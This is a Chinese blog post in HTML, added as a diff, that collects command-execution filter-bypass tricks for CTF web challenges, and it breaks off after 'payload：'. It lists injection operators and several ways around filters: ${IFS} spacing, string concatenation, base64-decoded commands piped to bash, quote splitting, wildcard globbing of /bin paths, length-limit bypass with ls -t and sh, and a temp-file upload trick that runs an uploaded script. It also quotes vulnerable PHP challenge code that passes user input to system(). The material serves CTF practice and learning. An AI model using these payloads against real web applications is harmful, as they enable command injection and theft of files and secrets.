@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"npfs06.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="重新对CTF中常见的命令执行绕过小技巧做了一个归纳总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行绕过小技巧">
+<meta property="og:url" content="https://npfs06.top/2021/02/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7/index.html">
+<meta property="og:site_name" content="安小琪&#39;s blog">
+<meta property="og:description" content="重新对CTF中常见的命令执行绕过小技巧做了一个归纳总结">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://img.npfs06.top/20210225161206.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="http://img.npfs06.top/20210225161339.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="http://img.npfs06.top/20210225161351.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="http://img.npfs06.top/20210225161405.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="http://img.npfs06.top/20210225161419.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="http://img.npfs06.top/20210225161433.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="http://img.npfs06.top/20210225161449.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://raw.githubusercontent.com/npfs06/Images/main/img/buu56-2.jpg">
+<meta property="og:image" content="http://img.npfs06.top/20210225143606.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="http://img.npfs06.top/20210225150320.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="article:published_time" content="2021-02-26T02:35:27.000Z">
+<meta property="article:modified_time" content="2021-02-26T04:28:48.125Z">
+<meta property="article:author" content="安小琪">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://img.npfs06.top/20210225161206.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+
+<link rel="canonical" href="https://npfs06.top/2021/02/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>命令执行绕过小技巧 | 安小琪's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">安小琪's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">少年有梦，不应止于心动</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://npfs06.top/2021/02/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="安小琪">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安小琪's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          命令执行绕过小技巧
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-02-26 10:35:27 / Modified: 12:28:48" itemprop="dateCreated datePublished" datetime="2021-02-26T10:35:27+08:00">2021-02-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/02/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/02/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p> 重新对CTF中常见的命令执行绕过小技巧做了一个归纳总结</p>
+<a id="more"></a>
+
+<h1 id="常见的系统命令执行函数"><a href="#常见的系统命令执行函数" class="headerlink" title="常见的系统命令执行函数"></a>常见的系统命令执行函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
+<p>这里需要注意一下，只有system函数是有回显的，其他的函数可以通过echo等显示</p>
+<p>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行</p>
+<h1 id="管道符-amp-通配符"><a href="#管道符-amp-通配符" class="headerlink" title="管道符&amp;通配符"></a>管道符&amp;通配符</h1><h2 id="windows-下"><a href="#windows-下" class="headerlink" title="windows 下"></a>windows 下</h2><blockquote>
+<p><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+</blockquote>
+<h2 id="Linux-下"><a href="#Linux-下" class="headerlink" title="Linux 下"></a>Linux 下</h2><blockquote>
+<p><code>;</code>前面和后面命令都要执行，无论前面真假<br><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+</blockquote>
+<p>在linux系统中 有一些通配符</p>
+<ul>
+<li>匹配任何字符串／文本，包括空字符串；</li>
+<li><code>*</code>代表任意字符（0个或多个)</li>
+<li><code>?</code> 匹配任何一个字符（不在括号内时）?代表任意1个字符</li>
+<li>[abcd] 匹配abcd中任何一个字符</li>
+<li>[a-z]  表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符</li>
+</ul>
+<hr>
+<h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><blockquote>
+<p><code>&gt;</code> <code>&lt;</code> <code>&lt;&gt;</code> 重定向符<br><code>%09</code>(需要php环境)<br><code>$&#123;IFS&#125; </code><br><code>$IFS$9</code><br><code>&#123;cat,flag.php&#125;</code>  //用逗号实现了空格功能<br><code>%20 </code><br><code>%09 </code></p>
+</blockquote>
+<hr>
+<h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><p>拼接</p>
+<blockquote>
+<p>  <code>a=c;b=at;c=fl;d=ag;$a$b $c$d</code></p>
+</blockquote>
+<p> base64编码</p>
+<blockquote>
+<p><code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d</code><br><code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash</code>   (在bash被过滤的情况下可尝试sh)</p>
+</blockquote>
+<p>单引号、双引号</p>
+<blockquote>
+<p><code>c&quot;&quot;at fl&#39;&#39;ag</code></p>
+</blockquote>
+<p>反斜线</p>
+<blockquote>
+<p><code>c\at fl\ag</code></p>
+</blockquote>
+<p>正则 (假设/bin/cat: test: 是一个目录)</p>
+<blockquote>
+<p><code>/???/?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</code><br><code>/???/?at ????</code><br><code>/???/?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</code></p>
+</blockquote>
+<p> $1、$2等和$@</p>
+ <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span># 是传给脚本的参数个数</span><br><span class="line"><span class="meta"><span class="meta-keyword">$0</span> 是脚本本身的名字</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$1</span> 是传递给该shell脚本的第一个参数</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$2</span> 是传递给该shell脚本的第二个参数</span></span><br><span class="line"><span class="symbol">$</span>@ 是传给脚本的所有参数的列表</span><br><span class="line"><span class="symbol">$</span>* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过<span class="number">9</span>个</span><br><span class="line"><span class="symbol">$</span><span class="symbol">$</span> 是脚本运行的当前进程ID号</span><br><span class="line"><span class="symbol">$</span>? 是显示最后命令的退出状态，<span class="number">0</span>表示没有错误，其他表示有错误</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h1 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h1><blockquote>
+<p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容</p>
+</blockquote>
+<h1 id="括号被过滤"><a href="#括号被过滤" class="headerlink" title="括号被过滤"></a>括号被过滤</h1><p><img src="http://img.npfs06.top/20210225161206.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<hr>
+<h1 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h1><blockquote>
+<p>cat$IFS$9`ls`</p>
+<p>cat$IFS$9$(ls)</p>
+</blockquote>
+<p>(内联，就是将``或$()内命令的输出作为输入执行)</p>
+<hr>
+<h1 id="利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过"><a href="#利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过" class="headerlink" title="利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)"></a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># touch &quot;ag&quot;</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># touch &quot;fl\\&quot;</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># touch &quot;t \\&quot;</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># touch &quot;ca\\&quot;</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># ls -t</span></span><br><span class="line"><span class="string">&#x27;ca\&#x27;  &#x27;</span>t \<span class="string">&#x27;  &#x27;</span>fl\<span class="string">&#x27;   ag   flag</span></span><br><span class="line"><span class="string">root@kali:~/桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span></span><br><span class="line"><span class="string">root@kali:~/桌面# sh a</span></span><br><span class="line"><span class="string">a: 1: a: not found</span></span><br><span class="line"><span class="string">flag&#123;hahaha&#125;</span></span><br><span class="line"><span class="string">a: 6: flag.txt: not found</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>\</code>是指换行<br><code>ls -t</code>将文件按时间排序输出<br><code>sh</code>命令可以从一个文件中读取命令来执行</p>
+</blockquote>
+<h1 id="bin"><a href="#bin" class="headerlink" title="bin/"></a>bin/</h1><p><strong>bin目录:</strong> </p>
+<p>bin为binary的简写主要放置一些 <a target="_blank" rel="noopener" href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</p>
+<p>这里我们可以利用 base64 中的64 进行通配符匹配  即 /bin/base64 flag.php</p>
+<p><strong>/usr/bin目录:</strong></p>
+<p>?c=/???/???/????2 ????.???      —》 然后在url + /flag.php.bz2</p>
+<p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome<em>、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb</em>、wget等。</p>
+<p>我们可以利用/usr/bin下的<strong>bzip2</strong></p>
+<p>意思就是说我们先将flag.php文件进行压缩，然后再将其下载</p>
+<h1 id="post上传文件进行命令执行"><a href="#post上传文件进行命令执行" class="headerlink" title="post上传文件进行命令执行"></a>post上传文件进行命令执行</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>首先构造一个post上传文件的数据包</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://17d01aae-51d9-48fe-abfb-d9ba10037d72.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上传一个php文件，文件内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+<p>注：shell程序必须以”#!/bin/sh”开始，#! /bin/sh 是指此脚本使用/bin/sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径</p>
+<p><img src="http://img.npfs06.top/20210225161339.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>上传抓包</p>
+<p>抓包之后添加参数c如下，多发包几次（因为并不一定生成的临时文件的最后一个字母就是大写字母），可以看到执行了ls命令</p>
+<p><img src="http://img.npfs06.top/20210225161351.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>注：这里为什么要传参数，以及参数内容为什么是  .%20/???/????????[@-[] ,P神的文章已经写的很详细了</p>
+<p><img src="http://img.npfs06.top/20210225161405.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p><img src="http://img.npfs06.top/20210225161419.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>1.php就是我们上传的可控的文件，我们传的参数c的值为 . /bin/phpXXXXXX，意思就是说匹配上传1.php文件所生成的临时文件，并执行之</p>
+<p>可以看到flag.php文件，</p>
+<p><img src="http://img.npfs06.top/20210225161433.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>用cat命令读取文件即可</p>
+<h1 id="无参数文件名构造"><a href="#无参数文件名构造" class="headerlink" title="无参数文件名构造"></a>无参数文件名构造</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>例如这题，我们需要构造的文件名为36</p>
+<p><img src="http://img.npfs06.top/20210225161449.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>payload：</p>
